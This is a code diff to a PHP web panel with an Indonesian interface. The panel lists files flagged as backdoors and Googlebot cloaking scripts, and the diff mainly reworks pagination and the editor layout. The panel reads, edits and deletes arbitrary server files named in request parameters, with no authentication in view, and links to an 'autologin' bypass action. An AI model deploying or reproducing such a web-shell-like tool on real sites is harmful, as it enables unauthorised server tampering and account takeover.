@@ -16,8 +16,10 @@ $default_path = (isset($_SERVER['DOCUMENT_ROOT']) && is_dir($_SERVER['DOCUMENT_R
 
 $path = $_GET['path'] ?? $default_path;
 $view = $_GET['view'] ?? null;
-$page = isset($_GET['page']) ? (int)$_GET['page'] : 1;
-if ($page < 1) $page = 1;
+$bpage = isset($_GET['bpage']) ? (int)$_GET['bpage'] : 1;
+$cpage = isset($_GET['cpage']) ? (int)$_GET['cpage'] : 1;
+if ($bpage < 1) $bpage = 1;
+if ($cpage < 1) $cpage = 1;
 $per_page = 10;
 
 // FILTER NAMA FILE
@@ -329,33 +331,50 @@ function showFileUrl($file) {
 /**
  * Helper: pagination dengan filter
  */
-function getPagination($total, $per_page, $current_page, $path, $filter_name = '') {
+function getPagination($total, $per_page, $current_page, $page_param, $path, $filter_name = '', $folder_mode = '', $selected_folder = '') {
     $total_pages = max(1, (int)ceil($total / $per_page));
     if ($total_pages <= 1) return '';
 
-    $filter_q = $filter_name !== '' ? '&filter_name=' . urlencode($filter_name) : '';
-    $html = '';
+    $paramsBase = [
+        'path' => $path,
+        'filter_name' => $filter_name,
+        'folder_mode' => $folder_mode,
+        'selected_folder' => $selected_folder,
+    ];
 
-    $html .= "<a href='?path=" . urlencode($path) . $filter_q . "&page=1' class='btn btn-sm btn-outline-primary me-1'>⏮ First</a>";
+    $html = '<div class="btn-group btn-group-sm w-100" role="group">';
+
+    $params = $paramsBase;
+    $params[$page_param] = 1;
+    $html .= "<a href='?" . htmlspecialchars(http_build_query($params)) . "' class='btn btn-outline-primary'>⏮ 1</a>";
 
     if ($current_page > 1) {
-        $html .= "<a href='?path=" . urlencode($path) . $filter_q . "&page=" . ($current_page - 1) . "' class='btn btn-sm btn-outline-primary me-1'>← Prev</a>";
+        $params = $paramsBase;
+        $params[$page_param] = $current_page - 1;
+        $html .= "<a href='?" . htmlspecialchars(http_build_query($params)) . "' class='btn btn-outline-primary'>←</a>";
     }
 
     $start = max(1, $current_page - 2);
-    $end   = min($total_pages, $current_page + 2);
+    $end = min($total_pages, $current_page + 2);
 
     for ($i = $start; $i <= $end; $i++) {
-        $active = $i == $current_page ? 'btn-primary' : 'btn-outline-primary';
-        $html  .= "<a href='?path=" . urlencode($path) . $filter_q . "&page=$i' class='btn btn-sm $active me-1'>$i</a>";
+        $params = $paramsBase;
+        $params[$page_param] = $i;
+        $active = ($i == $current_page) ? 'btn-primary' : 'btn-outline-primary';
+        $html .= "<a href='?" . htmlspecialchars(http_build_query($params)) . "' class='btn $active'>$i</a>";
     }
 
     if ($current_page < $total_pages) {
-        $html .= "<a href='?path=" . urlencode($path) . $filter_q . "&page=" . ($current_page + 1) . "' class='btn btn-sm btn-outline-primary me-1'>Next →</a>";
+        $params = $paramsBase;
+        $params[$page_param] = $current_page + 1;
+        $html .= "<a href='?" . htmlspecialchars(http_build_query($params)) . "' class='btn btn-outline-primary'>→</a>";
     }
 
-    $html .= "<a href='?path=" . urlencode($path) . $filter_q . "&page=$total_pages' class='btn btn-sm btn-outline-primary'>Last ⏭</a>";
+    $params = $paramsBase;
+    $params[$page_param] = $total_pages;
+    $html .= "<a href='?" . htmlspecialchars(http_build_query($params)) . "' class='btn btn-outline-primary'>$total_pages ⏭</a>";
 
+    $html .= '</div>';
     return $html;
 }
 
@@ -422,11 +441,20 @@ if ($filter_name !== '') {
 }
 $googlebot_files = array_values($googlebot_files);
 
-$backdoors = array_values($backdoors); // reset index
+$backdoors = array_values($backdoors); // reset index=
 
+// ===== PAGINATION TERPISAH - FIX BENAR =====
+$folders = getFolders($path);
+$bpage = isset($_GET['bpage']) ? max(1, (int)$_GET['bpage']) : 1;
+$cpage = isset($_GET['cpage']) ? max(1, (int)$_GET['cpage']) : 1;
+// BACKDOOR PAGINATION
 $total_backdoors = count($backdoors);
-$offset = ($page - 1) * $per_page;
-$page_files = array_slice($backdoors, $offset, $per_page);
+$offset_backdoor = ($bpage - 1) * $per_page;
+$page_files = array_slice($backdoors, $offset_backdoor, $per_page);
+
+$total_googlebot = count($googlebot_files);
+$offset_googlebot = ($cpage - 1) * $per_page;
+$page_googlebot_files = array_slice($googlebot_files, $offset_googlebot, $per_page);
 ?>
 <!DOCTYPE html>
 <html lang="id">
@@ -437,9 +465,17 @@ $page_files = array_slice($backdoors, $offset, $per_page);
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; font-family: 'Segoe UI', sans-serif; }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            font-family: 'Segoe UI', sans-serif;
+        }
         .main-container { margin-top: 30px; }
-        .card { border-radius: 15px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2); border: none; }
+        .card {
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            border: none;
+        }
         .card:hover { transform: translateY(-5px); transition: all 0.3s ease; }
         .card-header { border-radius: 15px 15px 0 0 !important; color: white; }
         .btn-primary { background: linear-gradient(45deg, #3498db, #2980b9); border: none; }
@@ -450,24 +486,58 @@ $page_files = array_slice($backdoors, $offset, $per_page);
         .btn-danger:hover { background: linear-gradient(45deg, #c0392b, #e74c3c); }
         .btn-warning { background: linear-gradient(45deg, #f1c40f, #f39c12); border: none; }
         .btn-warning:hover { background: linear-gradient(45deg, #f39c12, #f1c40f); }
-        .list-group-item { cursor: pointer; font-size: 0.85em; border-left: 4px solid #3498db; transition: all 0.3s; }
+        .list-group-item {
+            cursor: pointer;
+            font-size: 0.85em;
+            border-left: 4px solid #3498db;
+            transition: all 0.3s;
+        }
         .list-group-item:hover { background-color: #f8f9fa; transform: translateX(5px); }
         .url-box {
-            font-family: monospace; background: linear-gradient(135deg, #667eea, #764ba2); color: white;
-            padding: 15px; border-radius: 10px; word-break: break-all; margin-bottom: 15px;
+            font-family: monospace;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            word-break: break-all;
+            margin-bottom: 15px;
             box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
         }
-        /* FIX LAYOUT RAPi */
-        .row.equal-height > [class*="col"] { display: flex; flex-direction: column; }
+        .row.equal-height > [class*="col"] {
+            display: flex;
+            flex-direction: column;
+        }
         .card.h-100 { height: 100%; }
         .flex-fill { flex: 1; }
+
+        .script-editor-full {
+            min-height: 520px;
+        }
+        .card-body.script-editor-body {
+            display: flex;
+            flex-direction: column;
+        }
+        #edit-content {
+            width: 100%;
+            min-height: 420px;
+            resize: none;
+            border: none;
+            outline: none;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            line-height: 1.4;
+            tab-size: 4;
+            background: #f8f9fa;
+        }
+        .textarea-editable {
+            background: #fff !important;
+        }
     </style>
 </head>
 <body>
 <div class="container-fluid main-container">
-    <!-- ROW 1: 4 KOLOM ATAS -->
+
     <div class="row equal-height mb-4">
-        <!-- 1. PATH SCANNER - KIRI ATAS -->
         <div class="col-md-3">
             <div class="card h-100">
                 <div class="card-header bg-primary">
@@ -492,12 +562,13 @@ $page_files = array_slice($backdoors, $offset, $per_page);
                                 <option value="perscript" <?= ($folder_mode ?? '') === 'perscript' ? 'selected' : '' ?>>Per Script</option>
                             </select>
                         </div>
+
                         <?php if (($folder_mode ?? '') === 'per_page'): ?>
                         <div class="mb-3">
                             <label class="form-label">Pilih Folder:</label>
                             <select name="selected_folder" class="form-control">
                                 <option value="">-- Pilih Folder --</option>
-                                <?php foreach ($folders ?? [] as $folder): ?>
+                                <?php foreach (($folders ?? []) as $folder): ?>
                                 <option value="<?= htmlspecialchars($folder) ?>" <?= ($selected_folder ?? '') === $folder ? 'selected' : '' ?>>
                                     <?= htmlspecialchars($folder) ?>
                                 </option>
@@ -505,6 +576,7 @@ $page_files = array_slice($backdoors, $offset, $per_page);
                             </select>
                         </div>
                         <?php endif; ?>
+
                         <button type="submit" class="btn btn-primary w-100">
                             <i class="fas fa-search me-2"></i>Scan Sekarang
                         </button>
@@ -513,77 +585,106 @@ $page_files = array_slice($backdoors, $offset, $per_page);
             </div>
         </div>
 
-        <!-- 2. BACKDOOR SCANNER -->
         <div class="col-md-3">
-            <div class="card h-100">
-                <div class="card-header bg-danger">
-                    <h5 class="card-title mb-0"><i class="fas fa-skull me-2"></i>Backdoor <span class="badge bg-dark"><?= $total_backdoors ?? 0 ?></span></h5>
-                </div>
-                <div class="card-body flex-fill">
-                    <ul class="list-group list-group-flush">
-                        <?php if (!empty($page_files ?? [])): ?>
-                            <?php foreach ($page_files as $file): 
-                                $link = "?path=" . urlencode($path ?? '') . "&page=1&filter_name=" . urlencode($filter_name ?? '') . "&folder_mode=" . urlencode($folder_mode ?? '') . "&selected_folder=" . urlencode($selected_folder ?? '') . "&view=" . urlencode($file); ?>
-                            <li class="list-group-item list-group-item-danger">
-                                <a href="<?= $link ?>" class="text-danger">
-                                    <i class="fas fa-file-code me-2"></i><?= htmlspecialchars(basename($file)) ?>
-                                </a><br><small><?= htmlspecialchars($file) ?></small>
-                            </li>
-                            <?php endforeach; ?>
-                        <?php else: ?>
-                            <li class="list-group-item text-success">
-                                <i class="fas fa-shield-alt me-2"></i>CLEAN - No backdoor
-                            </li>
-                        <?php endif; ?>
-                    </ul>
-                </div>
-            </div>
+    <div class="card h-100">
+        <div class="card-header bg-danger">
+            <h5 class="card-title mb-0">
+                <i class="fas fa-skull me-2"></i>Backdoor
+                <span class="badge bg-dark"><?= (int)($total_backdoors ?? 0) ?></span>
+                <small class="text-white-50">(Hal. <?= (int)($bpage ?? 1) ?>)</small>
+            </h5>
         </div>
+        <div class="card-body flex-fill d-flex flex-column">
+            <ul class="list-group list-group-flush flex-fill" style="max-height: 300px; overflow-y: auto;">
+                <?php if (!empty($page_files)): ?>
+                    <?php foreach ($page_files as $file):
+                        $link = "?path=" . urlencode($path ?? '') .
+                            "&bpage=" . urlencode($bpage) .
+                            "&filter_name=" . urlencode($filter_name ?? '') .
+                            "&folder_mode=" . urlencode($folder_mode ?? '') .
+                            "&selected_folder=" . urlencode($selected_folder ?? '') .
+                            "&view=" . urlencode($file);
+                    ?>
+                    <li class="list-group-item list-group-item-danger">
+                        <a href="<?= $link ?>" class="text-danger text-decoration-none">
+                            <i class="fas fa-file-code me-2"></i><?= htmlspecialchars(basename($file)) ?>
+                        </a><br>
+                        <small class="text-muted"><?= htmlspecialchars($file) ?></small>
+                    </li>
+                    <?php endforeach; ?>
+                <?php else: ?>
+                    <li class="list-group-item text-success">
+                        <i class="fas fa-shield-alt me-2"></i>CLEAN - No backdoor
+                    </li>
+                <?php endif; ?>
+            </ul>
 
-        <!-- 3. CLOAKING BOT -->
-        <div class="col-md-3">
-            <div class="card h-100">
-                <div class="card-header bg-warning text-dark">
-                    <h5 class="card-title mb-0"><i class="fas fa-robot me-2"></i>Cloaking <span class="badge bg-dark"><?= $total_googlebot ?? 0 ?></span></h5>
-                </div>
-                <div class="card-body flex-fill">
-                    <ul class="list-group list-group-flush">
-                        <?php if (!empty($page_googlebot_files ?? [])): ?>
-                            <?php foreach ($page_googlebot_files as $file): 
-                                $link = "?path=" . urlencode($path ?? '') . "&page=1&filter_name=" . urlencode($filter_name ?? '') . "&folder_mode=" . urlencode($folder_mode ?? '') . "&selected_folder=" . urlencode($selected_folder ?? '') . "&view=" . urlencode($file); ?>
-                            <li class="list-group-item list-group-item-warning">
-                                <a href="<?= $link ?>" class="text-warning">
-                                    <i class="fas fa-robot me-2"></i><?= htmlspecialchars(basename($file)) ?>
-                                </a><br><small><?= htmlspecialchars($file) ?></small>
-                            </li>
-                            <?php endforeach; ?>
-                        <?php else: ?>
-                            <li class="list-group-item text-success">
-                                <i class="fas fa-shield-alt me-2"></i>CLEAN - No cloaking
-                            </li>
-                        <?php endif; ?>
-                    </ul>
-                </div>
+            <?php if ($total_backdoors > $per_page): ?>
+            <div class="mt-2 p-2 bg-light rounded pagination-backdoor">
+                <?= getPagination($total_backdoors, $per_page, $bpage, 'bpage', $path, $filter_name, $folder_mode, $selected_folder ?? '') ?>
             </div>
+            <?php endif; ?>
         </div>
+    </div>
+</div>
 
-        <!-- 4. KOSONG - untuk balance -->
+       <div class="col-md-3">
+    <div class="card h-100">
+        <div class="card-header bg-warning text-dark">
+            <h5 class="card-title mb-0">
+                <i class="fas fa-robot me-2"></i>Cloaking
+                <span class="badge bg-dark"><?= (int)($total_googlebot ?? 0) ?></span>
+                <small class="text-white">(Hal. <?= (int)($cpage ?? 1) ?>)</small>
+            </h5>
+        </div>
+        <div class="card-body flex-fill d-flex flex-column">
+            <ul class="list-group list-group-flush flex-fill" style="max-height: 300px; overflow-y: auto;">
+                <?php if (!empty($page_googlebot_files)): ?>
+                    <?php foreach ($page_googlebot_files as $file):
+                        $link = "?path=" . urlencode($path ?? '') .
+                            "&cpage=" . urlencode($cpage) .
+                            "&filter_name=" . urlencode($filter_name ?? '') .
+                            "&folder_mode=" . urlencode($folder_mode ?? '') .
+                            "&selected_folder=" . urlencode($selected_folder ?? '') .
+                            "&view=" . urlencode($file);
+                    ?>
+                    <li class="list-group-item list-group-item-warning">
+                        <a href="<?= $link ?>" class="text-warning text-decoration-none">
+                            <i class="fas fa-robot me-2"></i><?= htmlspecialchars(basename($file)) ?>
+                        </a><br>
+                        <small class="text-muted"><?= htmlspecialchars($file) ?></small>
+                    </li>
+                    <?php endforeach; ?>
+                <?php else: ?>
+                    <li class="list-group-item text-success">
+                        <i class="fas fa-shield-alt me-2"></i>CLEAN - No cloaking
+                    </li>
+                <?php endif; ?>
+            </ul>
+
+            <?php if ($total_googlebot > $per_page): ?>
+            <div class="mt-2 p-2 bg-light rounded pagination-cloaking">
+                <?= getPagination($total_googlebot, $per_page, $cpage, 'cpage', $path, $filter_name, $folder_mode, $selected_folder ?? '') ?>
+            </div>
+            <?php endif; ?>
+        </div>
+    </div>
+</div>
+
         <div class="col-md-3"></div>
     </div>
 
-    <!-- ROW 2: Edit File (kiri) + Script Editor (kanan) -->
     <div class="row equal-height">
-        <!-- 4. EDIT FILE - KIRI BAWAH (di bawah Path Scanner) -->
         <div class="col-md-3">
             <div class="card h-100">
                 <div class="card-header bg-info">
                     <h5 class="card-title mb-0"><i class="fas fa-edit me-2"></i>Edit File</h5>
                 </div>
                 <div class="card-body flex-fill d-flex flex-column">
-                    <?php if ($view ?? false): ?>
+                    <?php if (!empty($view)): ?>
                     <div class="url-box mb-2 p-2 small flex-fill">
                         <strong>URL:</strong><br>
-                        <small><?= showFileUrl($view) ?></small>
+                        <small><?= htmlspecialchars(showFileUrl($view)) ?></small>
                     </div>
                     <div class="btn-group-vertical flex-fill mb-2" role="group">
                         <button onclick="openPreview()" class="btn btn-success btn-sm mb-1">
@@ -605,63 +706,108 @@ $page_files = array_slice($backdoors, $offset, $per_page);
             </div>
         </div>
 
-        <!-- 5. SCRIPT EDITOR - KANAN BAWAH (di bawah Cloaking) -->
-        <?php if ($view ?? false): ?>
         <div class="col-md-9">
-            <div class="card h-100">
-                <div class="card-header d-flex justify-content-between bg-secondary">
-                    <h6 class="mb-0 text-white"><i class="fas fa-file-code"></i> <?= htmlspecialchars(basename($view)) ?></h6>
-                    <button class="btn btn-sm btn-outline-light" onclick="toggleEdit()">Toggle Edit</button>
+            <div class="card h-100 script-editor-full">
+                <div class="card-header d-flex justify-content-between align-items-center bg-secondary">
+                    <div>
+                        <h6 class="mb-0 text-white">
+                            <i class="fas fa-file-code me-2"></i>
+                            <?= !empty($view) ? htmlspecialchars(basename($view)) : 'Script Editor' ?>
+                            <?php if (!empty($view)): ?>
+                            <small class="text-white-50 ms-2">Size: <?= number_format(filesize($view) / 1024, 1) ?> KB</small>
+                            <?php endif; ?>
+                        </h6>
+                    </div>
+                    <button class="btn btn-sm btn-outline-light" onclick="toggleEdit()" id="toggle-btn" type="button">
+                        ✏️ Edit
+                    </button>
                 </div>
-                <div class="card-body p-0 flex-fill">
-                    <textarea id="edit-content" class="form-control w-100 h-100 p-3" style="font-family:monospace;font-size:12px;resize:none;border:none;" readonly><?= htmlspecialchars(file_get_contents($view)) ?></textarea>
+
+                <div class="card-body p-0 flex-fill script-editor-body">
+                    <?php if (!empty($view)): ?>
+                    <textarea id="edit-content" class="form-control w-100 h-100 p-3" readonly><?= htmlspecialchars(file_get_contents($view)) ?></textarea>
+                    <?php else: ?>
+                    <div class="d-flex align-items-center justify-content-center h-100 text-muted">
+                        <div class="text-center">
+                            <i class="fas fa-file-code fa-4x mb-4 opacity-50"></i>
+                            <h4>Pilih file dari Backdoor/Cloaking</h4>
+                            <p class="lead">Klik file untuk edit lengkap</p>
+                        </div>
+                    </div>
+                    <?php endif; ?>
                 </div>
-                <div class="card-footer bg-light">
-                    <form method="post" class="d-inline">
+
+                <?php if (!empty($view)): ?>
+                <div class="card-footer bg-light d-flex justify-content-between align-items-center">
+                    <form method="post" class="d-inline" id="save-form">
                         <input type="hidden" name="edit_file" value="<?= htmlspecialchars($view) ?>">
                         <textarea name="file_content" style="display:none;" id="hidden-content"><?= htmlspecialchars(file_get_contents($view)) ?></textarea>
-                        <button type="submit" class="btn btn-success btn-sm"><i class="fas fa-save me-1"></i>Save</button>
+                        <button type="submit" class="btn btn-success btn-sm" id="save-btn">
+                            <i class="fas fa-save me-1"></i>Save Changes
+                        </button>
                     </form>
-                    <form method="post" class="d-inline ms-2" onsubmit="return confirm('Hapus file?')">
-                        <input type="hidden" name="delete_file" value="<?= htmlspecialchars($view) ?>">
-                        <button type="submit" class="btn btn-danger btn-sm"><i class="fas fa-trash me-1"></i>Delete</button>
-                    </form>
+
+                    <div class="btn-group btn-group-sm">
+                        <button onclick="copyAll()" class="btn btn-outline-secondary" type="button" title="Copy All">
+                            <i class="fas fa-copy"></i>
+                        </button>
+                        <form method="post" class="d-inline" onsubmit="return confirm('Delete <?= htmlspecialchars(basename($view)) ?> ?')" style="margin:0;">
+                            <input type="hidden" name="delete_file" value="<?= htmlspecialchars($view) ?>">
+                            <button type="submit" class="btn btn-danger" title="Delete">
+                                <i class="fas fa-trash"></i>
+                            </button>
+                        </form>
+                        <a href="<?= htmlspecialchars(showFileUrl($view)) ?>" target="_blank" class="btn btn-outline-primary" title="Open">
+                            <i class="fas fa-external-link-alt"></i>
+                        </a>
+                    </div>
                 </div>
+                <?php endif; ?>
             </div>
         </div>
-        <?php else: ?>
-        <div class="col-md-9">
-            <div class="card h-100">
-                <div class="card-header bg-secondary">
-                    <h5 class="card-title mb-0 text-white"><i class="fas fa-code me-2"></i>Script Editor</h5>
-                </div>
-                <div class="card-body text-center text-muted d-flex align-items-center justify-content-center">
-                    <div><i class="fas fa-file-code fa-3x mb-3"></i><br><h6>Pilih file untuk edit</h6></div>
-                </div>
-            </div>
-        </div>
-        <?php endif; ?>
     </div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 <script>
-let currentUrl = '<?= $view ? (showFileUrl($view) ?? '') : '' ?>';
-let currentFilePath = '<?= addslashes($view ?? '') ?>';
+let currentUrl = <?= json_encode(!empty($view) ? showFileUrl($view) : '') ?>;
+let currentFilePath = <?= json_encode($view ?? '') ?>;
 
-function openPreview() { if (currentUrl) window.open(currentUrl, '_blank'); }
-function copyUrl() { 
-    navigator.clipboard.writeText(currentUrl).then(() => alert('✅ URL copied!')); 
+function openPreview() {
+    if (currentUrl) window.open(currentUrl, '_blank');
 }
+
+function copyUrl() {
+    if (!currentUrl) return;
+    navigator.clipboard.writeText(currentUrl).then(() => alert('✅ URL copied!'));
+}
+
 function autoLoginBypass() {
     if (!currentFilePath) return alert('No file selected');
     window.location.href = '?action=autologin&target=' + encodeURIComponent(currentFilePath);
 }
+
 function toggleEdit() {
     const textarea = document.getElementById('edit-content');
+    const btn = document.getElementById('toggle-btn');
+    if (!textarea || !btn) return;
+
     textarea.readOnly = !textarea.readOnly;
-    textarea.style.background = textarea.readOnly ? '#f8f9fa' : '#fff';
+    textarea.classList.toggle('textarea-editable', !textarea.readOnly);
+    btn.innerText = textarea.readOnly ? '✏️ Edit' : '✅ Readonly';
 }
+
+function copyAll() {
+    const textarea = document.getElementById('edit-content');
+    if (!textarea) return;
+    navigator.clipboard.writeText(textarea.value).then(() => alert('✅ File content copied!'));
+}
+
+document.getElementById('save-form')?.addEventListener('submit', function () {
+    const editor = document.getElementById('edit-content');
+    const hidden = document.getElementById('hidden-content');
+    if (editor && hidden) hidden.value = editor.value;
+});
 </script>
 </body>
 </html>
